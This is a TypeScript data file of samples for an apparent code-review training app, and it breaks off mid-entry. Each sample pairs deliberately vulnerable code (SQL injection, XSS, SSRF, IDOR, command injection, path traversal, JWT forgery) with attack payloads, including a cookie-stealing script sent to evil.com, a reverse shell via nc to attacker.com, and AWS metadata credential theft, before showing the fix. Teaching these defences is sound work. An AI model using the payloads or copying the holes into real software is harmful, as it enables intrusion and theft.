// Code Review Snippet Types and Sample Data

export interface CodeSnippet {
    id: string;
    title: string;
    description: string;
    language: 'javascript' | 'python' | 'php' | 'java' | 'sql' | 'go';
    category: 'sqli' | 'xss' | 'ssrf' | 'idor' | 'auth' | 'crypto' | 'injection' | 'xxe' | 'deserialization' | 'redirect' | 'traversal' | 'rng';
    difficulty: 'easy' | 'medium' | 'hard';
    vulnerableCode: string;
    exploitedCode: string; // Vulnerable code with malicious payload injected
    secureCode: string;
    secureExploitedCode: string; // Secure code showing how it handles the same payload
    vulnerableLines: number[]; // Line numbers to highlight
    explanation: string;
    hints: string[];
    vulnerabilityType: string;
    severity: 'low' | 'medium' | 'high' | 'critical';
    cwe?: string; // CWE ID
    owasp?: string; // OWASP category
    exploitExample?: {
        title: string;
        description: string;
        payload: string;
        result: string;
    };
}

export const codeSnippets: CodeSnippet[] = [
    {
        id: 'sql-injection-login',
        title: 'SQL Injection in Login',
        description: 'A classic SQL injection vulnerability in a login function that allows attackers to bypass authentication.',
        language: 'python',
        category: 'sqli',
        difficulty: 'easy',
        vulnerableCode: `def login(username, password):
    # Connect to database
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(query)
    
    user = cursor.fetchone()
    conn.close()
    
    if user:
        return {"success": True, "user": user}
    return {"success": False, "error": "Invalid credentials"}`,
        exploitedCode: `def login(username, password):
    # Connect to database
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # 🔴 EXPLOITED: Attacker input: username = "' OR '1'='1' --"
    # The query now becomes:
    query = f"SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'"
    #                                                  ↑ Always TRUE    ↑ Rest is commented out
    cursor.execute(query)
    
    user = cursor.fetchone()  # ✓ Returns first user (usually admin!)
    conn.close()
    
    if user:
        return {"success": True, "user": user}  # ✓ Login bypassed!
    return {"success": False, "error": "Invalid credentials"}`,
        secureCode: `def login(username, password):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    cursor.execute(query, (username, password))
    
    user = cursor.fetchone()
    conn.close()
    
    if user:
        return {"success": True, "user": user}
    return {"success": False, "error": "Invalid credentials"}`,
        secureExploitedCode: `def login(username, password):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # ✅ SAFE: Same malicious input "' OR '1'='1' --"
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    cursor.execute(query, (username, password))
    # The ? placeholder treats input as DATA, not SQL code
    # Query executed: SELECT * FROM users WHERE username = "' OR '1'='1' --" AND password = "anything"
    #                                                       ↑ Searched as literal string, not SQL!
    
    user = cursor.fetchone()  # Returns None - no match found
    conn.close()
    
    if user:
        return {"success": True, "user": user}
    return {"success": False, "error": "Invalid credentials"}  # ✅ Attack blocked!`,
        vulnerableLines: [6, 7],
        explanation: 'This code is vulnerable to SQL injection because user input is directly concatenated into the SQL query. An attacker can input `\' OR \'1\'=\'1` as the username to bypass authentication entirely.',
        hints: [
            'Look at how user input is being used in the query',
            'What happens if the username contains a single quote?',
            'Research parameterized queries or prepared statements'
        ],
        vulnerabilityType: 'SQL Injection',
        severity: 'critical',
        cwe: 'CWE-89',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Authentication Bypass',
            description: 'Attacker inputs a malicious username to bypass password check',
            payload: `Username: ' OR '1'='1' --
Password: anything`,
            result: `Query becomes:
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'

✓ The OR '1'='1' always evaluates to true
✓ The -- comments out the rest of the query
✓ Returns first user in database (usually admin)`
        }
    },
    {
        id: 'xss-reflected',
        title: 'Reflected XSS in Search',
        description: 'User input is reflected back in the page without proper sanitization, allowing script injection.',
        language: 'javascript',
        category: 'xss',
        difficulty: 'easy',
        vulnerableCode: `app.get('/search', (req, res) => {
    const query = req.query.q;
    
    res.send(\`
        <html>
            <body>
                <h1>Search Results</h1>
                <p>You searched for: \${query}</p>
                <div id="results"></div>
            </body>
        </html>
    \`);
});`,
        exploitedCode: `app.get('/search', (req, res) => {
    // 🔴 EXPLOITED: Attacker sends: /search?q=<script>steal()</script>
    const query = req.query.q;  // = "<script>document.location='https://evil.com?c='+document.cookie</script>"
    
    // The HTML now includes executable JavaScript:
    res.send(\`
        <html>
            <body>
                <h1>Search Results</h1>
                <p>You searched for: <script>document.location='https://evil.com?c='+document.cookie</script></p>
                <!--            ↑ BROWSER EXECUTES THIS SCRIPT! -->
                <div id="results"></div>
            </body>
        </html>
    \`);
    // ✓ Victim's cookies sent to attacker's server
    // ✓ Session hijacked!
});`,
        secureCode: `const escapeHtml = require('escape-html');

app.get('/search', (req, res) => {
    const query = req.query.q;
    const safeQuery = escapeHtml(query);
    
    res.send(\`
        <html>
            <body>
                <h1>Search Results</h1>
                <p>You searched for: \${safeQuery}</p>
                <div id="results"></div>
            </body>
        </html>
    \`);
});`,
        secureExploitedCode: `const escapeHtml = require('escape-html');

app.get('/search', (req, res) => {
    // ✅ SAFE: Same malicious input "<script>steal()</script>"
    const query = req.query.q;
    const safeQuery = escapeHtml(query);
    // escapeHtml converts: <script> → &lt;script&gt;
    
    res.send(\`
        <html>
            <body>
                <h1>Search Results</h1>
                <p>You searched for: &lt;script&gt;steal()&lt;/script&gt;</p>
                <!-- ↑ Displayed as TEXT, not executed as script! -->
                <div id="results"></div>
            </body>
        </html>
    \`);
    // ✅ User sees literal text "<script>steal()</script>"
    // ✅ No code execution, attack blocked!
});`,
        vulnerableLines: [8],
        explanation: 'The search query is directly embedded into the HTML response without sanitization. An attacker can craft a URL like `/search?q=<script>alert("XSS")</script>` to execute arbitrary JavaScript in the victim\'s browser.',
        hints: [
            'What characters have special meaning in HTML?',
            'What if the query contains < or > characters?',
            'Look into HTML entity encoding'
        ],
        vulnerabilityType: 'Cross-Site Scripting (XSS)',
        severity: 'high',
        cwe: 'CWE-79',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Script Injection via URL',
            description: 'Attacker crafts a malicious URL and tricks victim into clicking it',
            payload: `/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>`,
            result: `The page renders:
<p>You searched for: <script>document.location='https://evil.com/steal?c='+document.cookie</script></p>

✓ Script executes in victim's browser
✓ Cookies (including session) sent to attacker
✓ Attacker can hijack user session`
        }
    },
    {
        id: 'idor-user-profile',
        title: 'IDOR in User Profile',
        description: 'Direct object reference allows accessing other users\' profiles by changing the ID parameter.',
        language: 'javascript',
        category: 'idor',
        difficulty: 'medium',
        vulnerableCode: `app.get('/api/user/:id', async (req, res) => {
    const userId = req.params.id;
    
    const user = await User.findById(userId);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    res.json({
        id: user.id,
        email: user.email,
        phone: user.phone,
        address: user.address,
        ssn: user.ssn
    });
});`,
        exploitedCode: `// 🔴 EXPLOITED: Attacker (user ID 5) requests /api/user/1
app.get('/api/user/:id', async (req, res) => {
    const userId = req.params.id;  // = "1" (admin's ID)
    
    // No check if requester is authorized!
    const user = await User.findById(userId);  // Returns admin's data
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    // ✓ Attacker receives OTHER user's sensitive data:
    res.json({
        id: user.id,           // "1"
        email: user.email,     // "admin@company.com"
        phone: user.phone,     // "555-0100"
        address: user.address, // "123 Secret St"
        ssn: user.ssn          // "123-45-6789" ← LEAKED!
    });
});`,
        secureCode: `app.get('/api/user/:id', authMiddleware, async (req, res) => {
    const userId = req.params.id;
    const currentUser = req.user;
    
    if (userId !== currentUser.id && !currentUser.isAdmin) {
        return res.status(403).json({ error: 'Unauthorized' });
    }
    
    const user = await User.findById(userId);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    res.json({
        id: user.id,
        email: user.email,
        phone: userId === currentUser.id ? user.phone : undefined,
        address: userId === currentUser.id ? user.address : undefined
    });
});`,
        secureExploitedCode: `// ✅ SAFE: Attacker (user ID 5) tries to access /api/user/1
app.get('/api/user/:id', authMiddleware, async (req, res) => {
    const userId = req.params.id;  // "1" (trying to access admin)
    const currentUser = req.user;   // { id: "5", isAdmin: false }
    
    // Authorization check stops the attack
    if (userId !== currentUser.id && !currentUser.isAdmin) {
        return res.status(403).json({ error: 'Unauthorized' });
        // ✅ Returns 403 - request blocked here!
    }
    
    // This code never executes for unauthorized requests
    const user = await User.findById(userId);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    res.json({ ... });
});
// ✅ Attacker receives: {"error": "Unauthorized"}
// ✅ Admin data protected!`,
        vulnerableLines: [4],
        explanation: 'The endpoint retrieves user data based solely on the ID parameter without verifying if the requesting user is authorized to access that data. An attacker can enumerate user IDs to access sensitive information of other users.',
        hints: [
            'Who should be able to access this data?',
            'Is there any authentication or authorization?',
            'What if someone changes the ID in the URL?'
        ],
        vulnerabilityType: 'Insecure Direct Object Reference',
        severity: 'high',
        cwe: 'CWE-639',
        owasp: 'A01:2021 - Broken Access Control',
        exploitExample: {
            title: 'User Data Enumeration',
            description: 'Attacker changes user ID to access other accounts',
            payload: `# Logged in as user ID 5
curl https://api.example.com/api/user/1
curl https://api.example.com/api/user/2
curl https://api.example.com/api/user/3`,
            result: `Response for /api/user/1:
{
  "id": 1,
  "email": "admin@example.com",
  "phone": "555-0100",
  "ssn": "123-45-6789"  ← Sensitive!
}

✓ Access to all user data without authorization
✓ Can dump entire user database`
        }
    },
    {
        id: 'ssrf-url-fetch',
        title: 'SSRF in URL Preview',
        description: 'Server-side request forgery through unvalidated URL fetching for link previews.',
        language: 'javascript',
        category: 'ssrf',
        difficulty: 'hard',
        vulnerableCode: `app.post('/api/preview', async (req, res) => {
    const { url } = req.body;
    
    try {
        const response = await fetch(url);
        const html = await response.text();
        
        const title = html.match(/<title>(.*?)<\\/title>/)?.[1];
        const desc = html.match(/meta name="description" content="(.*?)"/)?.[1];
        
        res.json({ title, description: desc });
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch URL' });
    }
});`,
        exploitedCode: `app.post('/api/preview', async (req, res) => {
    // 🔴 EXPLOITED: Attacker sends internal URL
    const { url } = req.body;  // = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    
    try {
        // Server makes request to AWS metadata endpoint!
        const response = await fetch(url);
        const html = await response.text();
        
        // Response contains AWS credentials:
        // {
        //   "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
        //   "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/...",
        //   "Token": "..."
        // }
        // ✓ Attacker now has cloud access!
        
        res.json({ title: html, description: '' });
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch URL' });
    }
});`,
        secureCode: `const { URL } = require('url');
const ALLOWED_PROTOCOLS = ['http:', 'https:'];
const BLOCKED_HOSTS = ['localhost', '127.0.0.1', '0.0.0.0', '169.254.169.254'];

app.post('/api/preview', async (req, res) => {
    const { url } = req.body;
    
    try {
        const parsedUrl = new URL(url);
        
        if (!ALLOWED_PROTOCOLS.includes(parsedUrl.protocol)) {
            return res.status(400).json({ error: 'Invalid protocol' });
        }
        
        if (BLOCKED_HOSTS.some(host => parsedUrl.hostname.includes(host))) {
            return res.status(400).json({ error: 'Blocked host' });
        }
        
        const response = await fetch(url, { timeout: 5000 });
        const html = await response.text();
        
        const title = html.match(/<title>(.*?)<\\/title>/)?.[1];
        res.json({ title });
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch URL' });
    }
});`,
        secureExploitedCode: `// ✅ SAFE: Same attack "http://169.254.169.254/latest/meta-data/..."
const { URL } = require('url');
const BLOCKED_HOSTS = ['localhost', '127.0.0.1', '169.254.169.254'];

app.post('/api/preview', async (req, res) => {
    const { url } = req.body;  // "http://169.254.169.254/..."
    
    try {
        const parsedUrl = new URL(url);
        // parsedUrl.hostname = "169.254.169.254"
        
        // Blocklist check catches the attack
        if (BLOCKED_HOSTS.some(host => parsedUrl.hostname.includes(host))) {
            return res.status(400).json({ error: 'Blocked host' });
            // ✅ Stops here! Returns 400 Bad Request
        }
        
        // This code never executes for blocked hosts
        const response = await fetch(url);
        // ...
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch URL' });
    }
});
// ✅ Attacker receives: {"error": "Blocked host"}
// ✅ AWS credentials protected!`,
        vulnerableLines: [5],
        explanation: 'The server fetches any URL provided by the user without validation. An attacker can use this to access internal services (e.g., http://localhost:8080/admin), cloud metadata endpoints (http://169.254.169.254), or scan internal networks.',
        hints: [
            'What URLs should be allowed?',
            'Can the user make the server access internal resources?',
            'What about cloud metadata endpoints?'
        ],
        vulnerabilityType: 'Server-Side Request Forgery',
        severity: 'critical',
        cwe: 'CWE-918',
        owasp: 'A10:2021 - SSRF',
        exploitExample: {
            title: 'AWS Metadata Endpoint Access',
            description: 'Attacker uses SSRF to steal cloud credentials',
            payload: `POST /api/preview
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}`,
            result: `Response reveals AWS role name, then:

POST /api/preview
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole"}

{
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/...",
  "Token": "..."
}

✓ Full AWS credentials exposed
✓ Attacker can access S3, EC2, etc.`
        }
    },
    {
        id: 'weak-password-hash',
        title: 'Weak Password Hashing',
        description: 'Using MD5 for password hashing provides inadequate security against modern attacks.',
        language: 'python',
        category: 'crypto',
        difficulty: 'easy',
        vulnerableCode: `import hashlib

def register_user(username, password):
    password_hash = hashlib.md5(password.encode()).hexdigest()
    
    db.users.insert_one({
        'username': username,
        'password': password_hash
    })
    return True

def verify_password(username, password):
    user = db.users.find_one({'username': username})
    if not user:
        return False
    
    input_hash = hashlib.md5(password.encode()).hexdigest()
    return input_hash == user['password']`,
        exploitedCode: `# 🔴 EXPLOITED: Attacker gets database dump
# Database contains:
# { "username": "admin", "password": "5f4dcc3b5aa765d61d8327deb882cf99" }
# { "username": "alice", "password": "5f4dcc3b5aa765d61d8327deb882cf99" }  # Same hash!
# { "username": "bob",   "password": "e99a18c428cb38d5f260853678922e03" }

# Attacker uses hashcat or rainbow table:
# $ hashcat -m 0 hashes.txt rockyou.txt

# Results (in seconds):
# 5f4dcc3b5aa765d61d8327deb882cf99 = "password"  ← admin & alice use same password!
# e99a18c428cb38d5f260853678922e03 = "abc123"

# ✓ MD5 computes at ~25 BILLION hashes/second on GPU
# ✓ No salt = identical passwords have identical hashes
# ✓ All common passwords cracked in minutes`,
        secureCode: `import bcrypt

def register_user(username, password):
    password_bytes = password.encode('utf-8')
    salt = bcrypt.gensalt(rounds=12)
    password_hash = bcrypt.hashpw(password_bytes, salt)
    
    db.users.insert_one({
        'username': username,
        'password': password_hash.decode('utf-8')
    })
    return True

def verify_password(username, password):
    user = db.users.find_one({'username': username})
    if not user:
        return False
    
    password_bytes = password.encode('utf-8')
    stored_hash = user['password'].encode('utf-8')
    return bcrypt.checkpw(password_bytes, stored_hash)`,
        secureExploitedCode: `import bcrypt

# ✅ SAFE: Same attack - attacker gets database dump
# Database now contains bcrypt hashes:
# { "username": "admin", "password": "$2b$12$LQv3c1y..." }
# { "username": "alice", "password": "$2b$12$9KxW7vZ..." }  # Different hash!

def register_user(username, password):
    password_bytes = password.encode('utf-8')
    salt = bcrypt.gensalt(rounds=12)  # Unique salt per user
    password_hash = bcrypt.hashpw(password_bytes, salt)
    # Even "password" → "$2b$12$randomsalt...uniquehash"
    
    db.users.insert_one({
        'username': username,
        'password': password_hash.decode('utf-8')
    })
    return True

def verify_password(username, password):
    user = db.users.find_one({'username': username})
    if not user:
        return False
    
    # bcrypt internally extracts salt from stored hash
    password_bytes = password.encode('utf-8')
    stored_hash = user['password'].encode('utf-8')
    return bcrypt.checkpw(password_bytes, stored_hash)

# Attacker tries: hashcat -m 3200 bcrypt_hashes.txt rockyou.txt
# ✅ bcrypt: ~10-20 hashes/sec (vs 25 BILLION for MD5)
# ✅ Years to crack even common passwords`,
        vulnerableLines: [4],
        explanation: 'MD5 is a fast hashing algorithm, making it vulnerable to brute-force and rainbow table attacks. It also lacks salting, meaning identical passwords produce identical hashes. Modern password hashing requires slow algorithms like bcrypt, scrypt, or Argon2 with unique salts.',
        hints: [
            'How fast can MD5 hashes be computed?',
            'What is a rainbow table attack?',
            'Why is salting important for password storage?'
        ],
        vulnerabilityType: 'Weak Cryptography',
        severity: 'high',
        cwe: 'CWE-328',
        owasp: 'A02:2021 - Cryptographic Failures',
        exploitExample: {
            title: 'Rainbow Table Attack',
            description: 'Attacker uses precomputed hashes to crack passwords',
            payload: `# Password hash from leaked database:
5f4dcc3b5aa765d61d8327deb882cf99

# Lookup in rainbow table:
hashcat -m 0 -a 0 hash.txt rockyou.txt`,
            result: `5f4dcc3b5aa765d61d8327deb882cf99:password

✓ MD5 hash cracked in < 1 second
✓ "password" is a common password
✓ No salt = identical passwords have same hash
✓ Entire database can be cracked quickly`
        }
    },
    {
        id: 'command-injection-ping',
        title: 'OS Command Injection',
        description: 'User input is passed directly to system commands without sanitization.',
        language: 'python',
        category: 'injection',
        difficulty: 'medium',
        vulnerableCode: `import subprocess

def ping_host(host):
    cmd = f"ping -c 4 {host}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout`,
        exploitedCode: `import subprocess

def ping_host(host):
    # 🔴 EXPLOITED: Attacker input: host = "8.8.8.8; cat /etc/passwd"
    cmd = f"ping -c 4 8.8.8.8; cat /etc/passwd"
    #                         ↑ Command separator - runs second command!
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    # ✓ Returns: ping output + contents of /etc/passwd!
    return result.stdout`,
        secureCode: `import subprocess
import shlex

def ping_host(host):
    if not host.replace('.', '').isalnum():
        raise ValueError("Invalid hostname")
    
    result = subprocess.run(
        ["ping", "-c", "4", host],
        capture_output=True,
        text=True
    )
    return result.stdout`,
        secureExploitedCode: `import subprocess

def ping_host(host):
    # ✅ SAFE: Same attack "8.8.8.8; cat /etc/passwd"
    if not host.replace('.', '').isalnum():
        raise ValueError("Invalid hostname")
        # ✅ Raises error - semicolon is not alphanumeric!
    
    # Even if it passed, using list instead of string:
    result = subprocess.run(
        ["ping", "-c", "4", host],  # No shell=True, no command parsing
        capture_output=True,
        text=True
    )
    return result.stdout
    # ✅ Attack blocked at validation step!`,
        vulnerableLines: [4, 5],
        explanation: 'The user input is directly interpolated into a shell command. Using shell=True allows command chaining with ; | && etc. An attacker can inject additional commands to read files, spawn shells, or compromise the server.',
        hints: [
            'What does shell=True do in subprocess?',
            'Can special characters change command behavior?',
            'How can you run commands without shell interpretation?'
        ],
        vulnerabilityType: 'OS Command Injection',
        severity: 'critical',
        cwe: 'CWE-78',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Command Chaining',
            description: 'Attacker uses shell metacharacters to execute arbitrary commands',
            payload: `Host: 8.8.8.8; cat /etc/passwd
Host: 8.8.8.8 && whoami
Host: 8.8.8.8 | nc attacker.com 4444 -e /bin/sh`,
            result: `Command becomes:
ping -c 4 8.8.8.8; cat /etc/passwd

✓ First command pings 8.8.8.8
✓ Second command reads /etc/passwd
✓ Attacker can read any file or run any command`
        }
    },
    {
        id: 'path-traversal-download',
        title: 'Path Traversal in File Download',
        description: 'File path from user input allows directory traversal to access unauthorized files.',
        language: 'javascript',
        category: 'injection',
        difficulty: 'easy',
        vulnerableCode: `const express = require('express');
const path = require('path');

app.get('/download', (req, res) => {
    const filename = req.query.file;
    const filepath = path.join('/var/app/uploads', filename);
    res.download(filepath);
});`,
        exploitedCode: `const express = require('express');
const path = require('path');

app.get('/download', (req, res) => {
    // 🔴 EXPLOITED: Attacker requests ?file=../../../etc/passwd
    const filename = req.query.file;  // "../../../etc/passwd"
    const filepath = path.join('/var/app/uploads', '../../../etc/passwd');
    // filepath = "/etc/passwd"
    res.download(filepath);
    // ✓ Attacker downloads system password file!
});`,
        secureCode: `const express = require('express');
const path = require('path');

app.get('/download', (req, res) => {
    const filename = req.query.file;
    const uploadsDir = '/var/app/uploads';
    const filepath = path.join(uploadsDir, filename);
    
    if (!filepath.startsWith(uploadsDir)) {
        return res.status(403).json({ error: 'Access denied' });
    }
    
    res.download(filepath);
});`,
        secureExploitedCode: `const express = require('express');
const path = require('path');

app.get('/download', (req, res) => {
    // ✅ SAFE: Same attack "../../../etc/passwd"
    const filename = req.query.file;  // "../../../etc/passwd"
    const uploadsDir = '/var/app/uploads';
    const filepath = path.join(uploadsDir, filename);
    // filepath = "/etc/passwd" (path.join resolves ..)
    
    // Security check
    if (!filepath.startsWith(uploadsDir)) {
        return res.status(403).json({ error: 'Access denied' });
        // ✅ "/etc/passwd" doesn't start with "/var/app/uploads"
        // ✅ Returns 403 Forbidden!
    }
    
    res.download(filepath);  // Never reached
});`,
        vulnerableLines: [6],
        explanation: 'The filename from user input is used directly in file operations. An attacker can use ../ sequences to traverse outside the intended directory and access sensitive system files like /etc/passwd, configuration files, or source code.',
        hints: [
            'What does ../ mean in file paths?',
            'How can you ensure the file is within allowed directories?',
            'What sensitive files exist on Linux/Windows systems?'
        ],
        vulnerabilityType: 'Path Traversal',
        severity: 'high',
        cwe: 'CWE-22',
        owasp: 'A01:2021 - Broken Access Control',
        exploitExample: {
            title: 'Directory Traversal Attack',
            description: 'Attacker uses ../ to escape the uploads directory',
            payload: `GET /download?file=../../../etc/passwd
GET /download?file=....//....//etc/passwd
GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd`,
            result: `Resolved path: /etc/passwd

File contents returned:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

✓ Attacker can read any file on server`
        }
    },
    {
        id: 'jwt-none-algorithm',
        title: 'JWT None Algorithm Attack',
        description: 'JWT verification accepts "none" algorithm, allowing tokens to be forged.',
        language: 'javascript',
        category: 'auth',
        difficulty: 'hard',
        vulnerableCode: `const jwt = require('jsonwebtoken');

function verifyToken(token) {
    const decoded = jwt.decode(token, { complete: true });
    const algorithm = decoded.header.alg;
    
    return jwt.verify(token, secret, { algorithms: [algorithm] });
}`,
        exploitedCode: `const jwt = require('jsonwebtoken');

function verifyToken(token) {
    // 🔴 EXPLOITED: Attacker sends JWT with alg: "none"
    // Token: header.payload.  (empty signature)
    // Header: {"alg":"none","typ":"JWT"}
    // Payload: {"userId":"admin","role":"admin"}
    
    const decoded = jwt.decode(token, { complete: true });
    const algorithm = decoded.header.alg;  // "none"
    
    return jwt.verify(token, secret, { algorithms: [algorithm] });
    // ✓ Accepts algorithm from attacker's token!
    // ✓ "none" means no signature verification!
    // ✓ Attacker is now admin!
}`,
        secureCode: `const jwt = require('jsonwebtoken');

const ALLOWED_ALGORITHMS = ['HS256', 'HS384', 'HS512'];

function verifyToken(token) {
    return jwt.verify(token, secret, { 
        algorithms: ALLOWED_ALGORITHMS 
    });
}`,
        secureExploitedCode: `const jwt = require('jsonwebtoken');

const ALLOWED_ALGORITHMS = ['HS256', 'HS384', 'HS512'];

function verifyToken(token) {
    // ✅ SAFE: Same attack with alg: "none"
    // Attacker's token has {"alg":"none"} in header
    
    return jwt.verify(token, secret, { 
        algorithms: ALLOWED_ALGORITHMS  // Only HS256, HS384, HS512
    });
    // ✅ "none" not in allowed list
    // ✅ Throws: JsonWebTokenError: invalid algorithm
    // ✅ Forged token rejected!
}`,
        vulnerableLines: [5, 7],
        explanation: 'The application trusts the algorithm specified in the JWT header. An attacker can change the algorithm to "none" and remove the signature, creating a valid-looking token that bypasses verification entirely.',
        hints: [
            'Should the algorithm come from the token itself?',
            'What is the "none" algorithm in JWT?',
            'How do you whitelist allowed algorithms?'
        ],
        vulnerabilityType: 'Broken Authentication',
        severity: 'critical',
        cwe: 'CWE-327',
        owasp: 'A07:2021 - Identification Failures',
        exploitExample: {
            title: 'Algorithm None Attack',
            description: 'Attacker modifies JWT header to bypass signature verification',
            payload: `Original token:
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjV9.signature

Forged token (alg: none):
eyJhbGciOiJub25lIn0.eyJ1c2VySWQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.`,
            result: `Decoded forged token:
Header: {"alg":"none"}
Payload: {"userId":"admin","role":"admin"}
Signature: (empty)

✓ No signature to verify
✓ Server accepts attacker as admin
✓ Complete authentication bypass`
        }
    },
    {
        id: 'sqli-order-by',
        title: 'SQL Injection in ORDER BY',
        description: 'Dynamic column sorting vulnerable to SQL injection through ORDER BY clause.',
        language: 'python',
        category: 'sqli',
        difficulty: 'medium',
        vulnerableCode: `def get_products(sort_by='name'):
    query = f"SELECT * FROM products ORDER BY {sort_by}"
    cursor.execute(query)
    return cursor.fetchall()`,
        exploitedCode: `def get_products(sort_by='name'):
    # 🔴 EXPLOITED: Attacker sends sort_by = "(CASE WHEN (1=1) THEN name ELSE price END)"
    # Or for data extraction: "name; SELECT password FROM users--"
    query = f"SELECT * FROM products ORDER BY (CASE WHEN (SELECT password FROM users WHERE username='admin') LIKE 'a%' THEN name ELSE price END)"
    cursor.execute(query)
    # ✓ Response timing/ordering reveals password character by character!
    return cursor.fetchall()`,
        secureCode: `ALLOWED_COLUMNS = ['name', 'price', 'created_at', 'stock']

def get_products(sort_by='name'):
    if sort_by not in ALLOWED_COLUMNS:
        sort_by = 'name'
    
    query = f"SELECT * FROM products ORDER BY {sort_by}"
    cursor.execute(query)
    return cursor.fetchall()`,
        secureExploitedCode: `ALLOWED_COLUMNS = ['name', 'price', 'created_at', 'stock']

def get_products(sort_by='name'):
    # ✅ SAFE: Attacker sends malicious sort_by
    # sort_by = "(CASE WHEN...)"
    
    if sort_by not in ALLOWED_COLUMNS:
        sort_by = 'name'  # ✅ Falls back to safe default
    
    query = f"SELECT * FROM products ORDER BY name"
    cursor.execute(query)
    return cursor.fetchall()
    # ✅ Attack blocked by whitelist!`,
        vulnerableLines: [2],
        explanation: 'ORDER BY clauses cannot use parameterized queries for column names. Whitelisting allowed column names is the only safe approach.',
        hints: [
            'Can ORDER BY use parameterized queries?',
            'What values should be allowed for sorting?',
            'How can CASE statements extract data?'
        ],
        vulnerabilityType: 'SQL Injection',
        severity: 'high',
        cwe: 'CWE-89',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Boolean-based Blind SQLi',
            description: 'Attacker extracts data by observing result ordering',
            payload: `sort_by=(CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN name ELSE price END)`,
            result: `If password starts with 'a': sorted by name
If not: sorted by price

✓ Attacker iterates through characters
✓ Extracts full password from ordering behavior`
        }
    },
    {
        id: 'sqli-second-order',
        title: 'Second-Order SQL Injection',
        description: 'Stored input is later used unsafely in a different query context.',
        language: 'python',
        category: 'sqli',
        difficulty: 'hard',
        vulnerableCode: `def register(username, password):
    # Input is safely parameterized here
    cursor.execute(
        "INSERT INTO users (username, password) VALUES (?, ?)",
        (username, password)
    )

def change_password(username, new_password):
    # But username from DB is used unsafely later!
    cursor.execute(
        f"UPDATE users SET password = '{new_password}' WHERE username = '{username}'"
    )`,
        exploitedCode: `def register(username, password):
    # 🔴 STEP 1: Attacker registers with username: admin'--
    cursor.execute(
        "INSERT INTO users (username, password) VALUES (?, ?)",
        ("admin'--", "anything")  # Stored safely in DB
    )

def change_password(username, new_password):
    # 🔴 STEP 2: Later, when "admin'--" changes password:
    cursor.execute(
        f"UPDATE users SET password = 'hacked123' WHERE username = 'admin'--'"
        #                                                        ↑ Closes admin's WHERE
        #                                                             ↑ Comments out rest
    )
    # ✓ Admin's password is now "hacked123"!`,
        secureCode: `def register(username, password):
    cursor.execute(
        "INSERT INTO users (username, password) VALUES (?, ?)",
        (username, password)
    )

def change_password(username, new_password):
    cursor.execute(
        "UPDATE users SET password = ? WHERE username = ?",
        (new_password, username)
    )`,
        secureExploitedCode: `def register(username, password):
    # ✅ SAFE: Same attack - username = "admin'--"
    cursor.execute(
        "INSERT INTO users (username, password) VALUES (?, ?)",
        ("admin'--", "anything")  # Stored in DB
    )

def change_password(username, new_password):
    # ✅ Parameterized query treats username as DATA
    cursor.execute(
        "UPDATE users SET password = ? WHERE username = ?",
        ("newpass", "admin'--")
        #           ↑ Searched as literal string "admin'--"
    )
    # ✅ Only updates the user literally named "admin'--"
    # ✅ Real admin account is safe!`,
        vulnerableLines: [10, 11],
        explanation: 'Second-order SQL injection occurs when malicious input is stored safely but later retrieved and used unsafely. Always use parameterized queries even for data that "should be safe" from your own database.',
        hints: [
            'Is data from your own database always safe?',
            'What if a username contains SQL characters?',
            'Trace where stored data is used later'
        ],
        vulnerabilityType: 'SQL Injection',
        severity: 'critical',
        cwe: 'CWE-89',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Account Takeover via Stored Payload',
            description: 'Attacker registers with malicious username to later compromise admin',
            payload: `Step 1: Register as "admin'--"
Step 2: Request password change
Step 3: Query becomes: UPDATE users SET password='x' WHERE username='admin'--'`,
            result: `✓ Stored payload activates in different context
✓ Admin password changed to attacker's choice
✓ Full admin account takeover`
        }
    },
    {
        id: 'xss-stored',
        title: 'Stored XSS in Comments',
        description: 'User comments are stored and displayed to all users without sanitization.',
        language: 'javascript',
        category: 'xss',
        difficulty: 'medium',
        vulnerableCode: `app.post('/api/comments', async (req, res) => {
    const { postId, content } = req.body;
    await db.comments.insert({ postId, content, userId: req.user.id });
    res.json({ success: true });
});

app.get('/post/:id', async (req, res) => {
    const post = await db.posts.findById(req.params.id);
    const comments = await db.comments.find({ postId: req.params.id });
    
    let html = \`<h1>\${post.title}</h1>\`;
    comments.forEach(c => {
